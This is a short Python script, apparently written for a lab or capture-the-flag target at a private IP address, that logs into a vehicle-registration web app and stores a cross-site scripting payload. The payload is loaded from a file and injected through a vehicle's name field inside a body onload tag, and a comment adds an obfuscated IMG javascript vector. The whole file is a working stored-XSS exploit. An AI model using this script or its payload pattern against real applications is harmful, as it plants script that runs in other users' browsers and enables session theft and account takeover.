"""
This script will inject XSS into a user account, by adding a new vehicle. However, it requires that you
know:
    - Username
    - Password
"""

import requests

# load and format payload
payload = ''
with open(input('Payload: ')) as in_file:
    for line in in_file:
        payload += line.strip()

xss = input('Filler vehicle name: ') + '<body onload=' + payload + '>'

# <IMG SRC="jav   ascript:alert('XSS');"> 
user = requests.session()

r = user.post('http://10.66.28.202:8235/login', {
    'username': input('Username: '),
    'password': input('Password: ')
})
# print(r.text)

r = user.post('http://10.66.28.202:8235/register_vehicle', {
    'name': xss,
    'make': 'veryfancy',
    'model': 'yes',
    'v_type':'car',
    'reg_no':input("Registration no: ") 
})
print(r.text)
